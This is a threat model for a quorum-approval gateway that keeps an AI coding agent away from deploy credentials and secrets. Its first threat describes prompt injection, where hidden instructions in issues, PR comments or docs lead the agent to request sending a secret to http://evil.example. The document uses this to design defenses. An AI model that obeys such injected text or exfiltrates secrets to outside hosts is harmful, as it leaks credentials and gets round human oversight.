# Threat Model — Key-Holder Gateway

> **Owner**: P2 (draft structure) + P1 (TideCloak-specific cells)
> Fill in empty cells as implementation progresses.

---

## Assets

| Asset | Sensitivity | Where stored |
|-------|-------------|-------------|
| Production deploy credentials | Critical | Behind gateway (mock: fake-production server) |
| API keys / secrets | Critical | Behind gateway (mock: fake-secrets.txt) |
| External endpoint access | High | Behind gateway (mock: fake-external server) |
| Guardian identities | High | TideCloak |
| Action Request records | Medium | SQLite (gateway) |
| Audit log | Medium | SQLite (gateway) |
| Agent session token | Medium | Agent runtime (not in gateway) |

---

## What We Defend Against

### 1. Prompt Injection → Secret Exfiltration

**Attack**: A malicious issue, PR comment, or documentation file contains hidden instructions that cause the agent to call `request_send_external` with `destination: http://evil.example` and the secret payload.

**Mitigation**:
- Agent only has access to MCP tools; it cannot directly read or transmit secrets.
- `request_send_external` creates a *request* only — execution requires guardian quorum.
- Guardian UI shows the destination URL and flags `"external-domain"` and/or `"unknown-destination"` risk signals.
- Guardians review and reject the suspicious request.
- The secret value is never returned to the agent by the gateway.

**Residual risk**: Guardians who rubber-stamp without reading the destination.

---

### 2. Single Compromised Account (Guardian or Agent Account)

**Attack**: An attacker gains access to one guardian account and attempts to approve and execute a malicious action.

**Mitigation**:
- Default quorum is 2-of-3: a single account cannot reach quorum alone.
- Gateway enforces quorum count; proposer cannot approve their own request.
- TideCloak threshold authentication means no single server holds the guardian's full credential.

**Residual risk**: Two or more guardians compromised simultaneously.

---

### 3. DB Compromise / Admin Console Compromise

**Attack**: Attacker gains read access to the SQLite database or TideCloak admin console.

**Mitigation** *(aspirational — pending P1 verification)*:
- Secrets stored in the gateway are encrypted with TideCloak tag-based encryption.
- DB shows only ciphertext; plaintext requires live Fabric threshold participation.
- See DECISIONS.md TC-04 for current status.

**Current state**: **MOCKED** — secrets are stored as plaintext in the demo. This mitigation is aspirational.

**Residual risk (if implemented)**: If enough ORKs are compromised, decryption is possible.

---

## What We Explicitly Do NOT Defend Against

| Threat | Why not in scope | Honest statement |
|--------|-----------------|------------------|
| Enough guardians being tricked / rubber-stamping | Social engineering of the majority is beyond technical controls | "Quorum is only as strong as the weakest N guardians" |
| Sensitive actions not behind the gateway | We can only protect what we know about | "Deny-by-default tool list helps but cannot enumerate every capability" |
| Malicious code merged through hasty review | Quorum protects authority, not code quality | "Approve the deploy ≠ approve the code" |
| Legitimate guardian screenshots or leaks | Authorised users can always leak data they have access to | "The system protects against unauthorised access, not insider leaks" |
| Agent with free terminal access + secrets already on machine | Precondition: secrets must be out of the agent's reach | "Gateway is useless if secrets are already in the agent's env" |
| Network-level MITM between agent and gateway | TLS/mTLS is out of scope for the demo | "Production deployment needs TLS" |

---

## Compromise Matrix

> Status: ⬜ = empty (to fill) | 🟢 = mitigated | 🟡 = partially mitigated | 🔴 = not mitigated / accepted

| Attacker controls | Can deploy bad code | Can exfiltrate secret | Can send external | Can bypass audit |
|-------------------|--------------------|-----------------------|-------------------|-----------------|
| Agent session only | 🟢 blocked (quorum) | 🟢 blocked (quorum) | 🟢 blocked (quorum) | ⬜ |
| 1 guardian account | 🟢 blocked (quorum) | 🟢 blocked (quorum) | 🟢 blocked (quorum) | ⬜ |
| 2 guardian accounts | 🔴 possible | 🔴 possible | 🔴 possible | ⬜ |
| Gateway DB read | 🟡 aspirational (encryption) | 🟡 aspirational (encryption) | N/A | ⬜ |
| Gateway process | 🔴 possible | 🔴 possible | 🔴 possible | 🔴 possible |
| TideCloak admin console | ⬜ | ⬜ | ⬜ | ⬜ |
| Full network MITM | ⬜ | ⬜ | ⬜ | ⬜ |

---

## Risk Signals (Deterministic Rules)

The following signals are computed deterministically in the gateway when an action request is created. They are **advisory only** — they never block an action automatically.

| Signal | Trigger | Applies to |
|--------|---------|------------|
| `external-domain` | destination URL hostname is not in an allowlist | `request_send_external` |
| `unknown-destination` | destination URL hostname has never been seen before in audit log | `request_send_external` |
| `sensitive-tag` | `secret_name` matches a predefined sensitive pattern | `request_use_secret` |
| `unusual-volume` | more than N requests from the same proposer in the last T minutes | all tools |

---

## Audit Log

All of the following events are written to the append-only audit log:
- Action request created
- Approval received (guardian ID, decision, timestamp, parametersHash)
- Rejection received
- Quorum reached
- Execution attempted (success or failure)
- Expiry triggered
- Hash mismatch detected

The audit log is currently stored in SQLite. In production, it should be written to an append-only, tamper-evident store.
